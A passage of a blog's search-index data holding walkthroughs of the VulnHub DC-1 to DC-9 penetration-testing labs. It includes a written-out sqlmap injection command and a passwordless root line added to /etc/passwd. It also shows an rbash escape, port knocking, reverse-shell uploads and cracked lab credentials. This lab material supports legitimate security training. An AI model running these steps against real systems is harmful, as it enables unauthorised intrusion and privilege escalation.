saying that, there should not be any problems, but I feel the need to throw this out there just in case.**CREDITS**A big thanks goes out to the members of @m0tl3ycr3w.**CONTACT**I'm also very interested in hearing how people go about solving these challenges, so if you're up for writing a , please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you've DM'd me if you'd prefer).I can be contacted via Twitter - @DCAU7{: .prompt-tip }### Letâ€™s find the IP Address first >>![163-1.png](/Vulnhub-Files/img/DC-9/163-1.png)```bashIP : 10.0.2.15```{: .nolineno}## Port Scan Results âž¡ï¸![163-2.png](/Vulnhub-Files/img/DC-9/163-2.png)```bashOPEN PORTS >80 HTTPFiltered PORT >22 SSH (I think I have to open it through knocking ports )```{: .nolineno}____## Web Enumeration â¤µï¸I will be enumerating port 80 first and I got to this drupal static site.![163-3.png](/Vulnhub-Files/img/DC-9/163-3.png)![163-4.png](/Vulnhub-Files/img/DC-9/163-4.png)Now lets deal with search.php file from burpsuite â†’![163-5.png](/Vulnhub-Files/img/DC-9/163-5.png)Now save this request as `results.txt` and used `Sqlmap` Tool to figure out the sqli type and to extract some data â†’![163-6.png](/Vulnhub-Files/img/DC-9/163-6.png)![163-7.png](/Vulnhub-Files/img/DC-9/163-7.png)lets dig deeper â†’```sqlcommand :sqlmap -r results.txt -D Staff -T Users -```{: .nolineno}![163-8.png](/Vulnhub-Files/img/DC-9/163-8.png)```sqladmin : transorbital1```{: .nolineno}![163-9.png](/Vulnhub-Files/img/DC-9/163-9.png)![163-10.png](/Vulnhub-Files/img/DC-9/163-10.png)After login with admin credentials I got this page â†’ which says file not exist.![163-11.png](/Vulnhub-Files/img/DC-9/163-11.png)I got LFI on `welcome.php` page.![163-12.png](/Vulnhub-Files/img/DC-9/163-12.png)Now lets check for knocked ports which will open ssh port on **`/etc/knockd.conf`** â†’![163-13.png](/Vulnhub-Files/img/DC-9/163-13.png)Lets knock the ports â†’```bashsudo knock 100.2.16 7469 8475 9842```{: .nolineno}![163-14.png](/Vulnhub-Files/img/DC-9/163-14.png)Now lets check the result with scanning the network again with `nmap` Tool â†’![163-15.png](/Vulnhub-Files/img/DC-9/163-15.png)Now lets try hydra for ssh brute-force â†’I have saved username , passwords that I got from the sqli â†’![163-16.png](/Vulnhub-Files/img/DC-9/163-16.png)```bashchandlerb : UrAG0D!joeyt : Passw0rdjanitor : Ilovepeepee```{: .nolineno}---### SHELL âž¡ï¸![163-17.png](/Vulnhub-Files/img/DC-9/163-17.png)I got some new passwords !![163-18.png](/Vulnhub-Files/img/DC-9/163-18.png)Now use this password to ssh again for any other results â†’![163-19.png](/Vulnhub-Files/img/DC-9/163-19.png)```bashfredf : B4-Tru3-001```{: .nolineno}![163-20.png](/Vulnhub-Files/img/DC-9/163-20.png)![163-21.png](/Vulnhub-Files/img/DC-9/163-21.png)![163-22.png](/Vulnhub-Files/img/DC-9/163-22.png)Since this file is reading the content of a file and writing on another file â†’So lets append a password inside the `/etc/passwd` file â†’![163-23.png](/Vulnhub-Files/img/DC-9/163-23.png)![163-24.png](/Vulnhub-Files/img/DC-9/163-24.png)![163-25.png](/Vulnhub-Files/img/DC-9/163-25.png)![163-26.png](/Vulnhub-Files/img/DC-9/163-26.png)![163-27.png](/Vulnhub-Files/img/DC-9/163-27.png)___## Summery Notes â¤µï¸â†’ Very much hurdle came like **sqlmap with request , knocking , test.py**____> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DC : 8", "url": "/posts/DC-8/", "categories": "Proving Grounds, Play, DC", "tags": "Password Bruteforce, Drupal, Public Exploit, SQLi, SUIDs, Sqlmap, exim4, PrivEsc, DC, CMS", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>**ðŸ’¡ [DC-8](https://www.vulnhub.com/entry/dc-8,367/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This ...", "content": "## **Description â¤µï¸**>**ðŸ’¡ [DC-8](https://www.vulnhub.com/entry/dc-8,367/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This challenge is a bit of a hybrid between being an actual challenge, and being a \"proof of concept\" as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.The \"proof of concept\" portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.You probably would not even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it is definitely there and doing it is job.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I would not give you the answer, instead, I'll give you an idea about how to move forward.{: .prompt-tip }### Letâ€™s find the IP Address first >>![162-1.png](/Vulnhub-Files/img/DC-8/162-1.png)```bashIP : 10.0.2.14```{: .nolineno}## Port Scan Results âž¡ï¸![162-2.png](/Vulnhub-Files/img/DC-8/162-2.png)```bashOPEN PORTS >22 SSH80 HTTP```{: .nolineno}---## Web Enumeration â¤µï¸I checked port 80 and got this drupal site.![162-3.png](/Vulnhub-Files/img/DC-8/162-3.png)Again Drupal â†’Lets look into the directory or files bruteforcing with `ffuf` Tool â†’![162-4.png](/Vulnhub-Files/img/DC-8/162-4.png)So it contains `pgsql` so lets try `sqli` â†’![162-5.png](/Vulnhub-Files/img/DC-8/162-5.png)As I got to know that there is a database name `d7db` so lets see what it got â†’![162-6.png](/Vulnhub-Files/img/DC-8/162-6.png)With `Sqlmap` Tool ,I got these much tables on `d7db` database â†’![162-7.png](/Vulnhub-Files/img/DC-8/162-7.png)Lets check the users.csv files â†’```bashadmin,$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5zjohn,$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF```{: .nolineno}Lets use john the ripper to crack this â†’The `password.hash` contains the password hashes of users â†’![162-8.png](/Vulnhub-Files/img/DC-8/162-8.png)```bashturtle```{: .nolineno}![162-9.png](/Vulnhub-Files/img/DC-8/162-9.png)Now Lets perform these steps to achieve reverse shell â†’Contact Us â†’ WEBFORM â†’ Form Settings â†’ upload php reverse shell code â†’ Save Configurations.ADD something before the PHP code like any string .![162-10.png](/Vulnhub-Files/img/DC-8/162-10.png)![162-11.png](/Vulnhub-Files/img/DC-8/162-11.png)---### SHELL âž¡ï¸Now after getting the shell lets try SUIDS and GUIDS files â†’![162-12.png](/Vulnhub-Files/img/DC-8/162-12.png)Now lets exploit `exim4` â†’![162-13.png](/Vulnhub-Files/img/DC-8/162-13.png)![162-14.png](/Vulnhub-Files/img/DC-8/162-14.png)this exim code got 2 commands 1 for setuid and the 2nd one for netcat and that I used it â†’![162-15.png](/Vulnhub-Files/img/DC-8/162-15.png)![162-16.png](/Vulnhub-Files/img/DC-8/162-16.png)![162-17.png](/Vulnhub-Files/img/DC-8/162-17.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DC : 7", "url": "/posts/DC-7/", "categories": "Proving Grounds, Play, DC", "tags": "Drupal, OSINT, Public Exploit, PrivEsc, DC, CMS", "date": "2023-06-14 00:00:00 +0530", "snippet": "Description â¤µï¸ ðŸ’¡ DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.While this is not an overly technical challenge, it is not...", "content": "Description â¤µï¸ ðŸ’¡ DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.While this is not an overly technical challenge, it is not exactly easy.While it is kind of a logical progression from an earlier DC release (I would not tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably would not succeed.What you will need to do, is to think â€œoutsideâ€ of the box.Waaaaaay â€œoutsideâ€ of the box. :-)The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I would not give you the answer, instead, Iâ€™ll give you an idea about how to move forward.TECHNICAL INFORMATIONDC-7 is a VirtualBox VM built on Debian 64 bit, but there should not be any issues running it on most PCs.I have tested this on VMWare Player, but if there are any issues running this VM in VMware, have a read through ofÂ this.It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.Installation is simple - download it, unzip it, and then import it into VirtualBox or VMWare and away you go.IMPORTANTWhile there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.In saying that, there should not be any problems, but I feel the need to throw this out there just in case.CONTACTIâ€™m also very interested in hearing how people go about solving these challenges, so if youâ€™re up for writing a , please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after youâ€™ve DMâ€™d me if youâ€™d prefer).I can be contacted via Twitter - @DCAU7Letâ€™s find the IP Address firstÂ Â»IP â†’ 10.0.2.13Port Scan Results âž¡ï¸OPEN PORTS &gt;22 SSH80 HTTPWeb Enumeration â¤µï¸I checked port 80 and found this drupal site.I got Drupal 8.7.6 version of drupal site so lets exploit this version further more.Mean while I got this user from this site below @DC7USER.Lets look into it on web â†’On web, I did some reconnaissance and got this github repo â†’dc7user : MdR3xOgB7#dWNow lets try SSH login â†’SHELL âž¡ï¸Lets dig deeper inside the shell â†’I also found something in mail â†’from above script of sql-dump when I enumerated further on web I got this â†’Now lets try it out â†’Now lets login using this â¬†ï¸ credentials â†’Now I am admin so lets find a way to get the shell â†’For enabling for reverse shell I need to follow certain steps â†’Manage &gt; Extend &gt; List &gt; Install new moduleNow â†’Manage &gt; Extend &gt; filterThen click Install â†’Now reverse shell upload time â†’As I clicked on preview or save button my nc triggered â†’Now I uploaded again a shell for root â†’lets wait and see the results as â†’Summery Notes âž¡ï¸â†’ Very Interesting machine in terms of OSINTâ†’ and the reverse shell upload process for drupal is from web.â†’ then rest all about keen eyes for commands / code / directions /permissions. If you have any questions or suggestions, please leave a comment below.Thank You !" }, { "title": "DC : 6", "url": "/posts/DC-6/", "categories": "Proving Grounds, Play, DC", "tags": "Public Exploit, Recon, Wordpress, PrivEsc, DC, CMS, nmap", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>**ðŸ’¡ [DC-6](https://www.vulnhub.com/entry/dc-6,315/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This ...", "content": "## **Description â¤µï¸**>**ðŸ’¡ [DC-6](https://www.vulnhub.com/entry/dc-6,315/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This is not an overly difficult challenge so should be great for beginners.The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I would not give you the answer, instead, I'll give you an idea about how to move forward.**TECHNICAL INFORMATION**DC-6 is a VirtualBox VM built on Debian 64 bit, but there should not be any issues running it on most PCs.I have tested this on VMWare Player, but if there are any issues running this VM in VMware, have a read through of this.It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.Installation is simple - download it, unzip it, and then import it into VirtualBox or VMWare and away you go.NOTE: You WILL need to edit your hosts file on your pentesting device so that it reads something like:`192.168.0.142 wordy`NOTE: I've used 192.168.0.142 as an example. You'll need to use your normal method to determine the IP address of the VM, and adapt accordingly.This is VERY important.And yes, it is another WordPress based VM (although only my second one).**IMPORTANT**While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.In saying that, there should not be any problems, but I feel the need to throw this out there just in case.**CONTACT**I'm also very interested in hearing how people go about solving these challenges, so if you're up for writing a , please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you've DM'd me if you'd prefer).I can be contacted via Twitter - @DCAU7**CLUE**OK, this is not really a clue as such, but more of some \"we do not want to spend five years waiting for a certain process to finish\" kind of advice for those who just want to get on with the job.cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt That should save you a few years. ;-){: .prompt-tip }### Letâ€™s find the IP Address first >>![160-1.png](/Vulnhub-Files/img/DC-6/160-1.png)```bashIP : 10.0.2.12```{: .nolineno}## Port Scan Results âž¡ï¸![160-2.png](/Vulnhub-Files/img/DC-6/160-2.png)```bashOPEN PORTS >22 SSH80 HTTP```{: .nolineno}___## Web Enumeration â¤µï¸![160-3.png](/Vulnhub-Files/img/DC-6/160-3.png)So with `wpscan` Tool we got 5 users â†’![160-4.png](/Vulnhub-Files/img/DC-6/160-4.png)After checking all the things I got nothing so far then when I looked into the machine Site I got this â†’![160-5.png](/Vulnhub-Files/img/DC-6/160-5.png)Fucking hell â†’![160-6.png](/Vulnhub-Files/img/DC-6/160-6.png)Now lets try password Brute-force â†’![160-7.png](/Vulnhub-Files/img/DC-6/160-7.png)```bashmark : helpdesk01```{: .nolineno}Time to log into the wordpress â†’![Untitled](/Vulnhub-Files/img/DC-6/Untitled.png)I also searched an exploit related to `Activity Monitor` â†’![160-9.png](/Vulnhub-Files/img/DC-6/160-9.png)Now time to use it â†’![160-10.png](/Vulnhub-Files/img/DC-6/160-10.png)---### **SHELL âž¡ï¸**Now let is see the wp-config.php file â†’![160-11.png](/Vulnhub-Files/img/DC-6/160-11.png)```bashmeErKatZ```{: .nolineno}![160-12.png](/Vulnhub-Files/img/DC-6/160-12.png)```bashgraham : GSo7isUM1D4```{: .nolineno}Lets change the username as graham now â†’![160-13.png](/Vulnhub-Files/img/DC-6/160-13.png)Lets see how jens can lead me to root â†’![160-14.png](/Vulnhub-Files/img/DC-6/160-14.png)![160-15.png](/Vulnhub-Files/img/DC-6/160-15.png)![160-16.png](/Vulnhub-Files/img/DC-6/160-16.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DC : 5", "url": "/posts/DC-5/", "categories": "Proving Grounds, Play, DC", "tags": "LFI, SUIDs, Screen 4.5.0, PrivEsc, DC", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>**ðŸ’¡ [DC-5](https://vulnhub.com/entry/dc-5,314/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The plan ...", "content": "## **Description â¤µï¸**>**ðŸ’¡ [DC-5](https://vulnhub.com/entry/dc-5,314/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.And just for the record, there is no phpmailer exploit involved. :-)The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I would not give you the answer, instead, I'll give you an idea about how to move forward.But if you're really, really stuck, you can watch this video which shows the first step.**TECHNICAL INFORMATION**DC-5 is a VirtualBox VM built on Debian 64 bit, but there should not be any issues running it on most PCs.I have tested this on VMWare Player, but if there are any issues running this VM in VMware, have a read through of this.It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.Installation is simple - download it, unzip it, and then import it into VirtualBox or VMWare and away you go.**IMPORTANT**While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.In saying that, there should not be any problems, but I feel the need to throw this out there just in case.**CONTACT**I'm also very interested in hearing how people go about solving these challenges, so if you're up for writing a , please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you've DM'd me if you'd prefer).I can be contacted via Twitter - @DCAU7{: .prompt-info }### Letâ€™s find the IP Address first >>![lftoqyl5.bmp](/Vulnhub-Files/img/DC-5/lftoqyl5.bmp)```bashIP â†’ 10.0.2.11```{: .nolineno}## Port Scan Results âž¡ï¸![awk4kykf.bmp](/Vulnhub-Files/img/DC-5/awk4kykf.bmp)```bashOPEN PORTS >80 HTTP111 RPC35572 RPC```{: .nolineno}---## Web Enumeration â¤µï¸![9wv0k6r4.bmp](/Vulnhub-Files/img/DC-5/9wv0k6r4.bmp)Now I have LFI on page thankyou.php â†’![np0rhfng.bmp](/Vulnhub-Files/img/DC-5/np0rhfng.bmp)Now I have to look for changes into the program so I have to access log now and the path for this is â†’`/var/log/nginx/access.log`![159-5.png](/Vulnhub-Files/img/DC-5/159-5.png)Now lets try reverse shell code â†’I got in with nc command â†’![159-6.png](/Vulnhub-Files/img/DC-5/159-6.png)### **SHELL â†’**I checked the SUIDS file first â†’![159-8.png](/Vulnhub-Files/img/DC-5/159-8.png)Now lets find the exxploit about screen as it is common known vulnerability â†’![159-9.png](/Vulnhub-Files/img/DC-5/159-9.png)Lets try it out now â†’![159-11.png](/Vulnhub-Files/img/DC-5/159-11.png)Here is the flag â¤µï¸![159-12.png](/Vulnhub-Files/img/DC-5/159-12.png)---## Summery Notes â¤µï¸â†’ LFI on thankyou.phpâ†’ Screen 4.5.0 exploitâ†’ Root> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DC : 4", "url": "/posts/DC-4/", "categories": "Proving Grounds, Play, DC", "tags": "Password Bruteforce, LFI, PrivEsc, DC, Command Injection", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>**ðŸ’¡ [DC-4](https://vulnhub.com/entry/dc-4,313/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.Unlike th...", "content": "## **Description â¤µï¸**>**ðŸ’¡ [DC-4](https://vulnhub.com/entry/dc-4,313/)** is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I would not give you the answer, instead, I'll give you an idea about how to move forward.**TECHNICAL INFORMATION**DC-4 is a VirtualBox VM built on Debian 32 bit, so there should be no issues running it on most PCs.If there are any issues running this VM in VMware, have a read through of this.It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.**IMPORTANT**While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.In saying that, there should not be any problems, but I feel the need to throw this out there just in case.**CONTACT**I'm also very interested in hearing how people go about solving these challenges, so if you're up for writing a , please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you've DM'd me if you'd prefer).I can be contacted via Twitter - @DCAU7{: .prompt-tip }### Letâ€™s find the IP Address first >>![158-1.png](/Vulnhub-Files/img/DC-4/158-1.png)```bashIP â†’ 10.0.2.9```{: .nolineno}## Port Scan Results âž¡ï¸![158-2.png](/Vulnhub-Files/img/DC-4/158-2.png)```bashOPEN PORTS >22 SSH80 HTTP```{: .nolineno}---## Web Enumeration â¤µï¸![158-3.png](/Vulnhub-Files/img/DC-4/158-3.png)Lets fire up the burpsuites and see what I can do on this login page â†’![158-4.png](/Vulnhub-Files/img/DC-4/158-4.png)![158-5.png](/Vulnhub-Files/img/DC-4/158-5.png)After login â†’```{: .nolineno}admin : happy```{: .nolineno}![158-6.png](/Vulnhub-Files/img/DC-4/158-6.png)![158-7.png](/Vulnhub-Files/img/DC-4/158-7.png)Now lets try reverse shell code â†’I got in â†’![158-8.png](/Vulnhub-Files/img/DC-4/158-8.png)![158-9.png](/Vulnhub-Files/img/DC-4/158-9.png)![158-10.png](/Vulnhub-Files/img/DC-4/158-10.png)```bashNow I have some credentials â†’ \tjim : jibril04```{: .nolineno}![158-11.png](/Vulnhub-Files/img/DC-4/158-11.png)![158-12.png](/Vulnhub-Files/img/DC-4/158-12.png)```bashcharles : ^xHhA&hvim0y```{: .nolineno}![158-13.png](/Vulnhub-Files/img/DC-4/158-13.png)with teehee command works similar like tee so I am going to add a user with root permissions â†’```bashcommands â†’ shiva::0:0:::/bin/bash â†’ with no passwords set```{: .nolineno}![158-14.png](/Vulnhub-Files/img/DC-4/158-14.png)![158-15.png](/Vulnhub-Files/img/DC-4/158-15.png)![158-16.png](/Vulnhub-Files/img/DC-4/158-16.png)---Summery Notes â†’â†’ **NOTE** â†’ `tee` or `teehee -a /etc/passwd`â†’ Then adding a null user with no password **but as a root was very nice move**.> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DC : 3", "url": "/posts/DC-3/", "categories": "Proving Grounds, Play, DC", "tags": "Joomla, Kernel Exploit, Sqlmap, PrivEsc, DC, CMS", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ [DC-3](https://vulnhub.com/entry/dc-32,312/) is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.As with the ...", "content": "## **Description â¤µï¸**>ðŸ’¡ [DC-3](https://vulnhub.com/entry/dc-32,312/) is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I would not give you the answer, instead, I'll give you an idea about how to move forward.For those with experience doing CTF and Boot2Root challenges, this probably would not take you long at all (in fact, it could take you less than 20 minutes easily).If that is the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.**TECHNICAL INFORMATION**DC-3 is a VirtualBox VM built on Ubuntu 32 bit, so there should be no issues running it on most PCs.Please note: There was an issue reported with DC-3 not working with VMware Workstation. To get around that, I recommend using VirtualBox, however, I have created a separate DC-3 VMware edition for those who can only use VMware.It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.**IMPORTANT**While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.In saying that, there should not be any problems, but I feel the need to throw this out there just in case.**CONTACT**I'm also very interested in hearing how people go about solving these challenges, so if you're up for writing a , please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you've DM'd me if you'd prefer).I can be contacted via Twitter - @DCAU7This works better with VirtualBox rather than VMware ## Changelog v3.2 - 2020-04-25 v3.0 - 2019-03-26{: .prompt-tip }### Letâ€™s find the IP Address first >>![157-1.png](/Vulnhub-Files/img/DC-3/157-1.png)```bashIP â†’ 10.0.2.8```{: .nolineno}## Port Scan Results âž¡ï¸![157-2.png](/Vulnhub-Files/img/DC-3/157-2.png)```bashOPEN PORTS >80 HTTP```{: .nolineno}___## Web Enumeration â¤µï¸![157-3.png](/Vulnhub-Files/img/DC-3/157-3.png)I found one exploit on exploitdb site for `joomla 3.7.0` â†’```bashcommands â†’sqlmap -u \"http://10.0.2.8/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml\" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --dump -p list[fullordering]```{: .nolineno}![157-4.png](/Vulnhub-Files/img/DC-3/157-4.png)```bash[02:45:21] [INFO] fetching entries for table '#__users' in database 'joomladb'[02:45:21] [INFO] retrieved: 'freddy@norealaddress.net'[02:45:21] [INFO] retrieved: '629'[02:45:21] [INFO] retrieved: 'admin'[02:45:21] [INFO] retrieved: '{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}'[02:45:21] [INFO] retrieved: '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'[02:45:21] [INFO] retrieved: 'admin'Database: joomladb```{: .nolineno}so with the help of john the ripper I got the password â†’![157-5.png](/Vulnhub-Files/img/DC-3/157-5.png)```bashadmin : snoopy```{: .nolineno}![157-6.png](/Vulnhub-Files/img/DC-3/157-6.png)so I got In â†’Lets upload the reverse shell code now â†’![157-7.png](/Vulnhub-Files/img/DC-3/157-7.png)After this set the reverse shell at port 4444 and then click on **`Template Preview`** â†’![157-8.png](/Vulnhub-Files/img/DC-3/157-8.png)Now lets see What I have with this shell â†’`configuration.php` â†’![157-9.png](/Vulnhub-Files/img/DC-3/157-9.png)```bashsecret : 7M6S1HqGMvt1JYkYuser : rootpassword : squires```{: .nolineno}![157-10.png](/Vulnhub-Files/img/DC-3/157-10.png)![157-11.png](/Vulnhub-Files/img/DC-3/157-11.png)it worked â†’![157-12.png](/Vulnhub-Files/img/DC-3/157-12.png)![157-13.png](/Vulnhub-Files/img/DC-3/157-13.png)![157-14.png](/Vulnhub-Files/img/DC-3/157-14.png)---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DC : 2", "url": "/posts/DC-2/", "categories": "Proving Grounds, Play, DC", "tags": "Password Generate, rbash, Wordpress, PrivEsc, cewl, DC, CMS, git", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>**ðŸ’¡ [DC :2](https://vulnhub.com/entry/dc-2,311/)** âž¡ï¸Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penet...", "content": "## **Description â¤µï¸**>**ðŸ’¡ [DC :2](https://vulnhub.com/entry/dc-2,311/)** âž¡ï¸Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.As with the original DC-1, it is designed with beginners in mind.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.Just like with DC-1, there are five flags including the final flag.And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.In short, the only flag that really counts, is the final flag.For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.I have not explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.**TECHNICAL INFORMATION**DC-2 is a VirtualBox VM built on Debian 32 bit, so there should be no issues running it on most PCs.While I have not tested it within a VMware environment, it should also work.It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.Please note that you will need to set the hosts file on your pentesting device to something like:`192.168.0.145 dc-2`Obviously, replace 192.168.0.145 with the actual IP address of DC-2.It will make life a whole lot simpler (and a certain CMS may not work without it).If you're not sure how to do this, instructions are here.**IMPORTANT**While there should be no problems using this VM, by downloading it, you accept full responsibility for any unintentional damage that this VM may cause.In saying that, there should not be any problems, but I feel the need to throw this out there just in case.**CONTACT**This is the second vulnerable lab challenge that I've created, so feel free to let me know what you think of it.I'm also very interested in hearing how people go about solving these challenges, so if you're up for writing a , please do so and send me a link, or alternatively, follow me on Twitter, and DM me (you can unfollow after you've DM'd me if you'd prefer).I can be contacted via Twitter - @DCAU7{: .prompt-tip }### Letâ€™s find the IP Address first >>![156-1.png](/Vulnhub-Files/img/DC-2/156-1.png)```bashIP â†’ 10.0.2.7```{: .nolineno}## Port Scan Results âž¡ï¸![156-3.png](/Vulnhub-Files/img/DC-2/156-3.png)![156-2.png](/Vulnhub-Files/img/DC-2/156-2.png)```bashOPEN PORTS >80 HTTP7744 SSH```{: .nolineno}___## Web Enumeration â¤µï¸![156-4.png](/Vulnhub-Files/img/DC-2/156-4.png)WordPress 4.7.10wpscan â†’![156-5.png](/Vulnhub-Files/img/DC-2/156-5.png)![156-6.png](/Vulnhub-Files/img/DC-2/156-6.png)![156-7.png](/Vulnhub-Files/img/DC-2/156-7.png)Now generate the password using tool `cewl` â†’![156-8.png](/Vulnhub-Files/img/DC-2/156-8.png)![156-9.png](/Vulnhub-Files/img/DC-2/156-9.png)After bruteforcing the username as tom and password as generated from cewl Tool â†’```bashtom : parturient```{: .nolineno}![156-10.png](/Vulnhub-Files/img/DC-2/156-10.png)```bashjerry : adipiscing```{: .nolineno}![156-11.png](/Vulnhub-Files/img/DC-2/156-11.png)flag3.txt â†’![156-17.png](/Vulnhub-Files/img/DC-2/156-17.png)flag4.txt â†’![156-13.png](/Vulnhub-Files/img/DC-2/156-13.png)Now it is a restricted bash so I have to deal with it so lets see â†’I can use ls â†’ with that I can see many things inside `/home/tom/usr/bin` â†’![156-14.png](/Vulnhub-Files/img/DC-2/156-14.png)commands â†’```{: .nolineno}1. vi2. :set shell=/bin/bash3. :shell```{: .nolineno}![156-16.png](/Vulnhub-Files/img/DC-2/156-16.png)Now I can perform something â†’![156-18.png](/Vulnhub-Files/img/DC-2/156-18.png)![156-19.png](/Vulnhub-Files/img/DC-2/156-19.png)![156-20.png](/Vulnhub-Files/img/DC-2/156-20.png)![156-21.png](/Vulnhub-Files/img/DC-2/156-21.png)---## Summery Notes â†’â†’ The problem part was to get rid from restrictive bashâ†’ When I knew what to do ,To do so it was like holy shit !!â†’ set all was shit.> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DC : 1", "url": "/posts/DC-1/", "categories": "Proving Grounds, Play, DC", "tags": "Drupal, Public Exploit, SUIDs, find, PrivEsc, DC, CMS", "date": "2023-06-14 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>**ðŸ’¡ [DC-1](https://vulnhub.com/entry/dc-1,292/)** It is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.It was desig...", "content": "## **Description â¤µï¸**>**ðŸ’¡ [DC-1](https://vulnhub.com/entry/dc-1,292/)** It is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.To successfully complete this challenge, you will require 